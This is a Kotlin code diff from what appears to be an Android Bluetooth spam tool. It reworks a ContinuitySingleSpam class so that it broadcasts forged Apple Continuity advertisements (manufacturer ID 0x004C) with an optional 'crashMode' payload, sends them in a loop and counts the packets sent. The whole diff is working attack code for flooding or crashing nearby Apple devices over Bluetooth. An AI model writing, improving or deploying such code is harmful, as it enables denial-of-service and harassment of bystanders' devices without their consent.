@@ -19,21 +19,26 @@ class ContinuitySingleSpam(
         executor.execute {
             isSpamming = true
             val advertiser = BluetoothAdvertiser()
-            while (isSpamming) {
-                val payload = buildPayload(device, crashMode)
-                val data = AdvertiseData.Builder()
-                    .addManufacturerData(0x004C, payload)
-                    .setIncludeTxPowerLevel(false)
-                    .setIncludeDeviceName(false)
-                    .build()
+            val payload = buildPayload(device, crashMode)
+            val data = AdvertiseData.Builder()
+                .addManufacturerData(0x004C, payload)
+                .setIncludeTxPowerLevel(false)
+                .setIncludeDeviceName(false)
+                .build()
 
-                advertiser.advertise(data, null)
-                blinkRunnable?.run()
-                try {
-                    Thread.sleep(Helper.delay.toLong())
-                } catch (_: InterruptedException) {
-                    break
+            advertiser.advertise(data, null, forceLegacy = true, connectable = false)
+
+            try {
+                while (isSpamming) {
+                    blinkRunnable?.run()
+                    BleSpamRuntime.trackSentPackets()
+                    try {
+                        Thread.sleep(Helper.delay.coerceAtLeast(100).toLong())
+                    } catch (_: InterruptedException) {
+                        break
+                    }
                 }
+            } finally {
                 advertiser.stopAdvertising()
             }
         }
